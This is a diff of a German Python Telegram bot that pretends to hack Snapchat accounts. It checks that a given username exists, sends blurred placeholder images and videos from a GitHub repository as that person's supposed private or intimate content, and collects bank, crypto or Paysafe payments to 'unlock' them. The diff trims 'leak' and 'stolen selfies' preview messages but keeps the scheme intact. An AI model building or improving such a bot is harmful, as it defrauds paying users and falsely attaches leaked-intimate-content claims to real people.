@@ -26,32 +26,25 @@ from telegram.ext import (
     filters,
 )
 from telegram.constants import ParseMode
-
 # 📂 Datei für gespeicherte User
 USERS_FILE = "users.txt"
-
 # ✅ Umgebungsvariablen laden
 TOKEN = os.getenv("TOKEN")
 CHANNEL_ID = os.getenv("CHANNEL_ID")
 ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
-
 if not TOKEN:
     raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
 if not CHANNEL_ID or not ADMIN_CHAT_ID:
     raise ValueError("❌ 'CHANNEL_ID' oder 'ADMIN_CHAT_ID' fehlt!")
-
 CHANNEL_ID = int(CHANNEL_ID)
 ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)
-
 # 🗂️ Ordner für Videos und Bilder einrichten
 BASE = Path(__file__).parent
 IMAGE_DIR = BASE / "images"   # JPG/PNG hinein
 VIDEO_DIR = BASE / "videos"   # MP4 hinein
 TEMP_DIR  = BASE / "temp"     # Output
-
 for p in (IMAGE_DIR, VIDEO_DIR, TEMP_DIR):
     p.mkdir(exist_ok=True, parents=True)
-
 # 📥 GitHub Media Downloader (Render-optimiert)
 def download_github_media():
     """Downloads images and videos from GitHub repository"""
@@ -107,26 +100,20 @@ def download_github_media():
     
     print(f"🎯 Media-Download abgeschlossen!")
     return True
-
 # 🎛️ Blur-Einstellungen
 BLUR_IMAGE_RADIUS = 28
 VIDEO_BLUR_SIGMA = 36
-
 # ---- Webserver (Render Alive) ----
 app = Flask('')
-
 @app.route('/')
 def home():
     return "I'm alive"
-
 def keep_alive():
     port = int(os.environ.get("PORT", 5000))
     Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
-
 # ---- Speicher für einmalige Beweise ----
 user_proof_sent = set()
 user_content_counts = {}  # Store generated counts per user
-
 # ---- Video/Bild Verarbeitung ----
 def censor_image(input_path: Path, output_path: Path):
     """Zensiert ein Bild mit Gaussian Blur"""
@@ -138,7 +125,6 @@ def censor_image(input_path: Path, output_path: Path):
     except Exception as e:
         print(f"❌ Fehler beim Zensieren von {input_path}: {e}")
         return False
-
 def check_ffmpeg():
     """Check if ffmpeg is available"""
     try:
@@ -146,7 +132,6 @@ def check_ffmpeg():
         return True
     except (subprocess.CalledProcessError, FileNotFoundError):
         return False
-
 def censor_video(input_path: Path, output_path: Path):
     """Zensiert ein Video mit ffmpeg Gaussian Blur"""
     if not check_ffmpeg():
@@ -170,7 +155,6 @@ def censor_video(input_path: Path, output_path: Path):
     except subprocess.CalledProcessError as e:
         print("❌ ffmpeg Fehler:", e.stderr)
         return False
-
 async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, n_img: int, n_vid: int):
     """Sendet zensierte Bilder und Videos an den Benutzer"""
     # Ensure GitHub media is downloaded
@@ -189,27 +173,17 @@ async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
         await context.bot.send_message(user_id, text="⚠️ Keine GitHub Medien verfügbar")
         return
     
-    # Zufällige Auswahl aus verfügbaren GitHub Medien
-    pick_imgs = sample(imgs, min(n_img, len(imgs))) if imgs else []
-    pick_vids = sample(vids, min(n_vid, len(vids))) if vids else []
+    # Limit to maximum 3 images and 3 videos, ensure different selection each time
+    max_imgs = min(3, len(imgs))
+    max_vids = min(3, len(vids))
     
-    username = "Unknown"  # Fallback if username not available
+    pick_imgs = sample(imgs, max_imgs) if imgs else []
+    pick_vids = sample(vids, max_vids) if vids else []
     
-    # Spannende zufällige Vorschau-Nachrichten
-    preview_messages = [
-        f"🔥 EXCLUSIVE LEAK! {len(pick_imgs)} geheime Bilder + {len(pick_vids)} heiße Videos von {username} gefunden!",
-        f"💯 JACKPOT! {len(pick_imgs)} private Pics + {len(pick_vids)} intime Videos direkt aus dem Handy!",
-        f"⚡ BOMBE! {len(pick_imgs)} Selfies + {len(pick_vids)} Stories die niemand sehen sollte!",
-        f"🎯 TREFFER! {len(pick_imgs)} versteckte Fotos + {len(pick_vids)} geheime Clips entschlüsselt!",
-        f"🔞 WARNING! {len(pick_imgs)} heiße Bilder + {len(pick_vids)} intime Videos - zu krass für Snapchat!",
-        f"💎 PREMIUM CONTENT! {len(pick_imgs)} exclusive Pics + {len(pick_vids)} private Videos nur für dich!",
-        f"🚨 LEAK ALERT! {len(pick_imgs)} gestohlene Selfies + {len(pick_vids)} geheime Aufnahmen!"
-    ]
-    
-    preview_msg = sample(preview_messages, 1)[0]
+    # Simple preview message
     await context.bot.send_message(
         chat_id=user_id,
-        text=preview_msg
+        text="Vorschau"
     )
     
     success_count = 0
@@ -273,7 +247,6 @@ async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYP
         text=payment_msg,
         parse_mode='HTML'
     )
-
 # ---- Snapchat Check ----
 def check_snapchat_username_exists_and_get_name(username: str):
     url = f"https://www.snapchat.com/@{username}"
@@ -298,7 +271,6 @@ def check_snapchat_username_exists_and_get_name(username: str):
     except Exception as e:
         print("Fehler beim Abruf von Snapchat:", e)
         return False, None
-
 # ---- START ----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -316,7 +288,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Schicke Beweise für Zahlungen (Bank & Crypto als Foto, Paysafe als Code) direkt hier im Chat."
     )
     await update.message.reply_text(text)
-
 # ---- ADMIN: /listusers ----
 async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
@@ -333,7 +304,6 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Noch keine Nutzer gespeichert.")
     else:
         await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")
-
 # ---- HACK ----
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -395,7 +365,6 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Sofort nach der Nachricht die entsprechende Anzahl Videos und Bilder von GitHub senden
     await send_content_to_user(update, context, user_id, bilder, videos)
-
 # ---- PAY ----
 async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
@@ -405,7 +374,6 @@ async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
-
 # ---- BUTTONS ----
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -459,7 +427,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
-
 # ---- PHOTO (Beweis) ----
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     from_user = update.message.from_user
@@ -496,7 +463,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         print("Fehler beim Senden des Beweisfotos:", e)
         await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos.")
-
 # ---- TEXT (Paysafe-Code) ----
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
@@ -519,7 +485,6 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             counts = user_content_counts[user_id]
             await send_content_to_user(update, context, user_id, counts["bilder"], counts["videos"])
             del user_content_counts[user_id]  # Cleanup nach dem Senden
-
 # ---- ADMIN: /sendcontent - Manuelles Senden für Tests ----
 async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
@@ -535,15 +500,12 @@ async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     except Exception as e:
         await update.message.reply_text(f"❌ Fehler: {e}\nNutzung: /sendcontent <bilder> <videos>")
-
 # ---- DUMMY INVITE/REDEEM/FAQ ----
 async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = "🎁 Lade Freunde ein und erhalte einen kostenlosen Hack!\n\n🔗 https://t.me/+eR1UqN8_OUhlNzcx"
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
-
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")
-
 async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
     faq_text = (
         "📖 *Häufig gestellte Fragen (FAQ)*\n\n"
@@ -555,7 +517,6 @@ async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "💬 Mit /pay nach dem Hack."
     )
     await update.message.reply_text(faq_text, parse_mode=ParseMode.MARKDOWN)
-
 # ---- MAIN ----
 def main():
     print("🚀 Bot startet...")
@@ -579,6 +540,5 @@ def main():
     
     print("🤖 Bot läuft! Drücke Ctrl+C zum Beenden.")
     application.run_polling()
-
 if __name__ == "__main__":
     main()
